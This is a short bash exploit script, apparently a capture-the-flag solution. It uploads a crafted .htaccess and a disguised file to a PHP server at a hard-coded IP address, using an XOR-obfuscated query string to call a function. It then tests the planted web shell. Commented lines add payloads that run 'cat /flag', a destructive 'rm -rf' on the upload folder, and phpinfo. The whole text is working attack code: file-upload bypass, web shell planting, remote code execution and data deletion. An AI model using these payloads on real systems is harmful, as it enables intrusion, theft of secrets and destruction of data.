#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/08/18, 23:32


echo "[+] Gen v.vk & .htaccess"
python gen_exp.py


echo "[+] Upload .htaccess"
curl -q -s 'http://47.111.59.243:9001/?_=$\{%A0%A0%A0%A0^%FF%E7%E5%F4\}\{%A0\}();&%A0=get_the_flag' -F file=@.htaccess

echo
echo "[+] Upload v.vk"
curl -q -s 'http://47.111.59.243:9001/?_=$\{%A0%A0%A0%A0^%FF%E7%E5%F4\}\{%A0\}();&%A0=get_the_flag' -F "file=@v.vk"

echo
echo "[+] Test shell"
curl -q -s "http://47.111.59.243:9001/upload/tmp_b014c6955563f4707974a5dbfbc82632/v.vk" -d "1=print_r(1111);"

# curl -s -q http://47.111.59.243:9021/uploads/74d3224455627bcd098e7b7824f00e3b/index.php \
# -d "1=system('cat /flag');//system('rm -rf /app/uploads/*');"

# http://47.111.59.243:9001/?_=$\{%A0%A0%A0%A0^%FF%E7%E5%F4\}\{%A0\}();&%A0=phpinfo

echo "[+] Clear"
rm .htaccess v.vk